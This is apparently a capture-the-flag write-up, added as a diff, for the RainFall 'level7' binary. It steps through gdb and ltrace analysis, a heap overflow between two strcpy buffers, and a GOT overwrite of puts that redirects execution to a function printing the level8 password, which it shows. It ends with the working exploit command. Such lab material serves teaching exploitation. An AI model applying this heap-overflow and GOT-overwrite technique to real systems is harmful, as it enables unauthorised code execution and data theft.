@@ -1,0 +1,138 @@
+# We have a executable "level7" lets do some test!
+
+level7@RainFall:~$ ./level7
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 test
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 test test
+~~
+level7@RainFall:~$ ./level7 test test test
+~~
+level7@RainFall:~$
+
+# Hum so the program take a minimum of two argument and print ~~
+
+# Let's use gdb to disasamble main
+
+(gdb) disas main
+[...]
+   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+[...]
+   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+[...]
+   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+[...]
+   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+[...]
+   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+[...]
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+[...]
+   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+[...]
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+[...]
+
+# There is a lot of call, let's use ltrace to see more clearly what's the code do
+
+level7@RainFall:~$ ltrace ./level7 test1 test2
+__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                                                     = 0x0804a008
+malloc(8)                                                                                                                     = 0x0804a018
+malloc(8)                                                                                                                     = 0x0804a028
+malloc(8)                                                                                                                     = 0x0804a038
+strcpy(0x0804a018, "test1")                                                                                                   = 0x0804a018
+strcpy(0x0804a038, "test2")                                                                                                   = 0x0804a038
+fopen("/home/user/level8/.pass", "r")                                                                                         = 0
+fgets( <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+# So the strcpy take argv[1] and argv[2] as argument so we can influence that and the fopen open .pass.
+
+    0x080485e4 <+195>:	movl   $0x8049960,(%esp)
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+
+# And the result of the fopen is put in the 0x8049960 address
+
+# But the puts call doesnt print this address, maybe there are other function?
+
+(gdb) info function
+[...]
+0x080484d0  frame_dummy
+0x080484f4  m
+0x08048521  main
+[...]
+
+# There is a m function
+
+(gdb) disas m
+[...]
+   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:	mov    %edx,(%esp)
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+[...]
+
+# And the m function printf the same address fgets use to put the return of fopen!
+
+# So we must call the m function after the fgets call but how?
+
+# Well the program take two args and we can make the first overflow in the second! (0x0804a018/0x0804a038)
+
+# So we can change where the address of the puts point to make it point to the m function!
+
+gdb) x/i 0x8048400
+   0x8048400 <puts@plt>:	jmp    *0x8049928
+
+# We will make that the first argument will buffer overflow the second argument by 4 bytes and those byte are the address where puts go (0x8049928)
+
+# And after that the second argument will replace that by the address of the m function! (0x080484f4)
+
+# We just need to determine the padding
+
+gdb) b *0x080485a5
+Breakpoint 1 at 0x80485a5
+(gdb) b *0x080485c2
+Breakpoint 2 at 0x80485c2
+
+# Now let's do some test
+
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA test
+Starting program: /home/user/level7/level7 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA test
+
+Breakpoint 1, 0x080485a5 in main ()
+(gdb) x/s $eax
+0x804a018:	 'A' <repeats 35 times>
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+# 35 is to high
+
+(gdb) r AAAAAAAAAAAAAAAAAAAA test
+Starting program: /home/user/level7/level7 AAAAAAAAAAAAAAAAAAAA test
+
+Breakpoint 1, 0x080485a5 in main ()
+(gdb) x/s $eax
+0x804a018:	 'A' <repeats 20 times>
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080485c2 in main ()
+
+# 20 seems good let's try it outside gdb
+
+level7@RainFall:~$ ./level7 $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - -1327609048
+
+
+
+
+
+
+
